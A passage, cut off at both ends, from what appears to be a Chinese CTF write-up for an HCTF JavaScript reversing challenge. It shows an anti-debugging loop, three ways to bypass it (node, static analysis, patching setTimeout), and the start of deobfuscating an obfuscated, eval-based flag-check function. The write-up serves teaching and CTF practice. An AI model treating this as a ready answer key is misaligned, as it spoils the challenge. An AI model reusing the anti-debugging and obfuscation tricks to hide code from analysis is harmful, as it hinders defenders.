                <span class="token punctuation">(</span>function b<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">&apos;&apos;</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i <span class="token operator">/</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">!==</span> <span class="token number">1</span> <span class="token operator">||</span> i <span class="token operator">%</span> <span class="token number">20</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token punctuation">(</span>function <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>constructor<span class="token punctuation">(</span><span class="token string">&apos;debugger&apos;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                        debugger
                    <span class="token punctuation">}</span>
                    b<span class="token punctuation">(</span><span class="token operator">++</span>i<span class="token punctuation">)</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span> catch <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                setTimeout<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>&#x8FD9;&#x5C31;&#x662F;&#x6BD4;&#x8F83;&#x5E38;&#x89C1;&#x7684;&#x53CD;&#x8C03;&#x8BD5;&#x3002;&#x6211;&#x8FD9;&#x91CC;&#x63D0;&#x4F9B;3&#x79CD;&#x529E;&#x6CD5;&#x6765;&#x89E3;&#x51B3;&#x8FD9;&#x6B65;&#x3002;</p> <p>1&#x3001;&#x4F7F;&#x7528;node&#x505A;&#x4EE3;&#x7801;&#x8C03;&#x8BD5;&#x3002;<br>&#x7531;&#x4E8E;&#x8FD9;&#x91CC;&#x7684;debugger&#x68C0;&#x6D4B;&#x7684;&#x662F;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x8C03;&#x8BD5;&#xFF0C;&#x5982;&#x679C;&#x76F4;&#x63A5;&#x5BF9;&#x4EE3;&#x7801;&#x8C03;&#x8BD5;&#x5C31;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x8FD9;&#x6837;&#x7684;&#x95EE;&#x9898;&#x3002;</p> <p>2&#x3001;&#x9759;&#x6001;&#x5206;&#x6790;<br>&#x56E0;&#x4E3A;&#x9898;&#x76EE;&#x4E2D;&#x4EE3;&#x7801;&#x8F83;&#x5C11;&#xFF0C;&#x6211;&#x6CA1;&#x529E;&#x6CD5;&#x628A;&#x4EE3;&#x7801;&#x6DF7;&#x5165;&#x6DF1;&#x5C42;&#x903B;&#x8F91;&#xFF0C;&#x5BFC;&#x81F4;&#x4EE3;&#x7801;&#x53EF;&#x4EE5;&#x7EAF;&#x9759;&#x6001;&#x5206;&#x6790;&#x3002;</p> <p>3&#x3001;patch debugger&#x51FD;&#x6570;<br>&#x7531;&#x4E8E;debugger&#x672C;&#x8EAB;&#x667A;&#x6167;&#x89E6;&#x53D1;&#x4E00;&#x6B21;&#xFF0C;&#x4E0D;&#x4F1A;&#x65E0;&#x9650;&#x5236;&#x7684;&#x5361;&#x6B7B;&#x8C03;&#x8BD5;&#x5668;&#xFF0C;&#x8FD9;&#x91CC;&#x4F1A;&#x51FA;&#x73B0;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x6BCF;5s&#x8F6E;&#x8BE2;&#x68C0;&#x67E5;&#x4E00;&#x6B21;&#x3002;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;patch settimeout&#x51FD;&#x6570;&#x6765;&#x7ED5;&#x8FC7;&#x3002;</p> <pre><code>window<span class="token punctuation">.</span>_setTimeout <span class="token operator">=</span> window<span class="token punctuation">.</span>setTimeout<span class="token punctuation">;</span>
window<span class="token punctuation">.</span>setTimeout <span class="token operator">=</span> function <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x63D2;&#x4EF6;TamperMonkey&#x89E3;&#x51B3;&#x95EE;&#x9898;&#x3002;</p> <p>&#x9664;&#x4E86;&#x5361;&#x6B7B;debug&#x4EE5;&#x5916;&#xFF0C;&#x6211;&#x8FD8;&#x52A0;&#x5165;&#x4E86;&#x8F6E;&#x8BE2;&#x5237;&#x65B0;console&#x7684;&#x4EE3;&#x7801;&#x3002;</p> <pre><code>setInterval<span class="token punctuation">(</span><span class="token string">&quot;window.console.log(&apos;Welcome to HCTF :&gt;&apos;)&quot;</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>&#x540C;&#x6837;&#x7684;&#x529E;&#x6CD5;&#x53EF;&#x4EE5;&#x89E3;&#x51B3;&#xFF0C;&#x5C31;&#x4E0D;&#x591A;&#x8BF4;&#x4E86;&#x3002;</p> <h4 id="&#x4EE3;&#x7801;&#x6DF7;&#x6DC6;">&#x4EE3;&#x7801;&#x6DF7;&#x6DC6;</h4> <p>&#x5728;&#x53BB;&#x9664;&#x6389;&#x8FD9;&#x90E8;&#x5206;&#x65E0;&#x7528;&#x4EE3;&#x7801;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x63A5;&#x7740;&#x60F3;&#x529E;&#x6CD5;&#x53BB;&#x9664;&#x4EE3;&#x7801;&#x6DF7;&#x6DC6;&#x3002;</p> <p>&#x8FD9;&#x91CC;&#x6700;&#x5916;&#x5C42;&#x7684;&#x4EE3;&#x7801;&#x6DF7;&#x6DC6;&#xFF0C;&#x6211;&#x662F;&#x901A;&#x8FC7;<a href="https://github.com/javascript-obfuscator/javascript-obfuscator"target="_blank">https://github.com/javascript-obfuscator/javascript-obfuscator</a>&#x505A;&#x4E86;&#x6DF7;&#x6DC6;&#x3002;</p> <p>ps:&#x56E0;&#x4E3A;&#x6211;&#x5728;&#x4EE3;&#x7801;&#x91CC;&#x52A0;&#x5165;&#x4E86;es6&#x8BED;&#x6CD5;&#xFF0C;&#x5E02;&#x9762;&#x4E0A;&#x7684;&#x5F88;&#x591A;&#x5DE5;&#x5177;&#x90FD;&#x4E0D;&#x652F;&#x6301;es6&#x8BED;&#x6CD5;&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;&#x53BB;&#x6DF7;&#x6DC6;&#x7684;&#x4EE3;&#x7801;&#x8BED;&#x6CD5;&#x9519;&#x8BEF;&#xFF01;</p> <p>&#x66F4;&#x6709;&#x8DA3;&#x7684;&#x662F;&#xFF0C;&#x8FD9;&#x79CD;&#x6DF7;&#x6DC6;&#x662F;&#x4E0D;&#x53EF;&#x9006;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EA;&#x80FD;&#x901A;&#x8FC7;&#x9010;&#x6E10;&#x53BB;&#x6DF7;&#x6DC6;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x7F8E;&#x5316;&#x4EE3;&#x7801;&#x3002;</p> <p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5148;&#x7B80;&#x5355;&#x7F8E;&#x5316;&#x4E00;&#x4E0B;&#x4EE3;&#x7801;&#x683C;&#x5F0F;</p> <pre><code>    <span class="token punctuation">(</span>function <span class="token punctuation">(</span>_0xd4b7d6<span class="token punctuation">,</span> _0xad25ab<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        var _0x5e3956 <span class="token operator">=</span> function <span class="token punctuation">(</span>_0x1661d3<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>_0x1661d3<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                _0xd4b7d6<span class="token punctuation">[</span><span class="token string">&apos;push&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0xd4b7d6<span class="token punctuation">[</span><span class="token string">&apos;shift&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
        _0x5e3956<span class="token punctuation">(</span><span class="token operator">++</span>_0xad25ab<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">(</span>_0x180a<span class="token punctuation">,</span> <span class="token number">0x1a2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    var _0xa180 <span class="token operator">=</span> function <span class="token punctuation">(</span>_0x5c351c<span class="token punctuation">,</span> _0x2046d8<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        _0x5c351c <span class="token operator">=</span> _0x5c351c <span class="token operator">-</span> <span class="token number">0x0</span><span class="token punctuation">;</span>
        var _0x26f3b3 <span class="token operator">=</span> _0x180a<span class="token punctuation">[</span>_0x5c351c<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> _0x26f3b3<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    function check<span class="token punctuation">(</span>_0x5b7c0c<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        try <span class="token punctuation">{</span>
            var _0x2e2f8d <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&apos;code&apos;</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x0&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x1&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x2&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&apos;invalidMonetizationCode&apos;</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x3&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x4&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x5&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x6&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x7&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x8&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x9&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0xa&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0xb&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0xc&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0xd&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0xe&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0xf&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x10&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x11&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&apos;url&apos;</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x12&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x13&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x14&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x15&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x16&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x17&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x18&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&apos;tabs&apos;</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x19&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x1a&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x1b&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x1c&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x1d&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&apos;replace&apos;</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x1e&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x1f&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&apos;includes&apos;</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x20&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&apos;length&apos;</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x21&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x22&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x23&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x24&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x25&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x26&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x27&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x28&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x29&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&apos;toString&apos;</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x2a&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&apos;split&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            var _0x50559f <span class="token operator">=</span> _0x5b7c0c<span class="token punctuation">[</span>_0x2e2f8d<span class="token punctuation">[</span><span class="token number">0x5</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            var _0x5cea12 <span class="token operator">=</span> parseInt<span class="token punctuation">(</span>btoa<span class="token punctuation">(</span>_0x50559f<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            eval<span class="token punctuation">(</span>function <span class="token punctuation">(</span>_0x200db2<span class="token punctuation">,</span> _0x177f13<span class="token punctuation">,</span> _0x46da6f<span class="token punctuation">,</span> _0x802d91<span class="token punctuation">,</span> _0x2d59cf<span class="token punctuation">,</span> _0x2829f2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                _0x2d59cf <span class="token operator">=</span> function <span class="token punctuation">(</span>_0x4be75f<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">return</span> _0x4be75f<span class="token punctuation">[</span><span class="token string">&apos;toString&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x177f13<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token string">&apos;&apos;</span> <span class="token punctuation">[</span><span class="token string">&apos;replace&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token regex">/^/</span><span class="token punctuation">,</span> <span class="token builtin">String</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">while</span> <span class="token punctuation">(</span>_0x46da6f<span class="token operator">--</span><span class="token punctuation">)</span> _0x2829f2<span class="token punctuation">[</span>_0x2d59cf<span class="token punctuation">(</span>_0x46da6f<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> _0x802d91<span class="token punctuation">[</span>_0x46da6f<span class="token punctuation">]</span> <span class="token operator">||</span> _0x2d59cf<span class="token punctuation">(</span>_0x46da6f<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    _0x802d91 <span class="token operator">=</span> <span class="token punctuation">[</span>function <span class="token punctuation">(</span>_0x5e8f1a<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">return</span> _0x2829f2<span class="token punctuation">[</span>_0x5e8f1a<span class="token punctuation">]</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                    _0x2d59cf <span class="token operator">=</span> function <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">return</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x2b&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span><span class="token punctuation">;</span>
                    _0x46da6f <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token punctuation">;</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span>_0x46da6f<span class="token operator">--</span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x802d91<span class="token punctuation">[</span>_0x46da6f<span class="token punctuation">]</span><span class="token punctuation">)</span> _0x200db2 <span class="token operator">=</span> _0x200db2<span class="token punctuation">[</span>_0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x2c&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">&apos;\x5cb&apos;</span> <span class="token operator">+</span> _0x2d59cf<span class="token punctuation">(</span>_0x46da6f<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&apos;\x5cb&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;g&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _0x802d91<span class="token punctuation">[</span>_0x46da6f<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> _0x200db2<span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">(</span>_0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x2d&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> _0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x2e&apos;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&apos;split&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&apos;|&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">(</span>function <span class="token punctuation">(</span>_0x3291b7<span class="token punctuation">,</span> _0xced890<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                var _0xaed809 <span class="token operator">=</span> function <span class="token punctuation">(</span>_0x3aba26<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>_0x3aba26<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        _0x3291b7<span class="token punctuation">[</span>_0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x4&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x3291b7<span class="token punctuation">[</span><span class="token string">&apos;shift&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span class="token punctuation">;</span>
                _0xaed809<span class="token punctuation">(</span><span class="token operator">++</span>_0xced890<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">(</span>_0x2e2f8d<span class="token punctuation">,</span> _0x5cea12 <span class="token operator">%</span> <span class="token number">0x7b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            var _0x43c8d1 <span class="token operator">=</span> function <span class="token punctuation">(</span>_0x3120e0<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                var _0x3120e0 <span class="token operator">=</span> parseInt<span class="token punctuation">(</span>_0x3120e0<span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                var _0x3a882f <span class="token operator">=</span> _0x2e2f8d<span class="token punctuation">[</span>_0x3120e0<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> _0x3a882f<span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">;</span>
            var _0x1c3854 <span class="token operator">=</span> function <span class="token punctuation">(</span>_0x52ba71<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                var _0x52b956 <span class="token operator">=</span> <span class="token string">&apos;0x&apos;</span><span class="token punctuation">;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span>var _0x59c050 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span> _0x59c050 <span class="token operator">&lt;</span> _0x52ba71<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span> _0x59c050<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    _0x52b956 <span class="token operator">+</span><span class="token operator">=</span> _0x52ba71<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;f&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x59c050<span class="token punctuation">)</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">return</span> _0x52b956<span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">;</span>
            var _0x76e1e8 <span class="token operator">=</span> _0x5b7c0c<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xe</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&apos;_&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            var _0x34f55b <span class="token operator">=</span> <span class="token punctuation">(</span>_0x1c3854<span class="token punctuation">(</span>_0x76e1e8<span class="token punctuation">[</span><span class="token number">0x0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x2</span><span class="token punctuation">,</span> <span class="token number">0x2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> _0x1c3854<span class="token punctuation">(</span>_0x76e1e8<span class="token punctuation">[</span><span class="token number">0x0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> _0x76e1e8<span class="token punctuation">[</span><span class="token number">0x0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x5</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>_0x34f55b<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            b2c <span class="token operator">=</span> function <span class="token punctuation">(</span>_0x3f9bc5<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                var _0x3c3bd8 <span class="token operator">=</span> <span class="token string">&apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&apos;</span><span class="token punctuation">;</span>
                var _0x4dc510 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                var _0x4a199f <span class="token operator">=</span> <span class="token constant">Math</span><span class="token punctuation">[</span>_0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x25&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x3f9bc5<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">0x5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                var _0x4ee491 <span class="token operator">=</span> _0x3f9bc5<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">0x5</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x4ee491 <span class="token operator">!=</span> <span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">for</span> <span class="token punctuation">(</span>var _0x1e1753 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span> _0x1e1753 <span class="token operator">&lt;</span> <span class="token number">0x5</span> <span class="token operator">-</span> _0x4ee491<span class="token punctuation">;</span> _0x1e1753<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        _0x3f9bc5 <span class="token operator">+</span><span class="token operator">=</span> <span class="token string">&apos;&apos;</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                    _0x4a199f <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span>_0x1e1753 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span> _0x1e1753 <span class="token operator">&lt;</span> _0x4a199f<span class="token punctuation">;</span> _0x1e1753<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
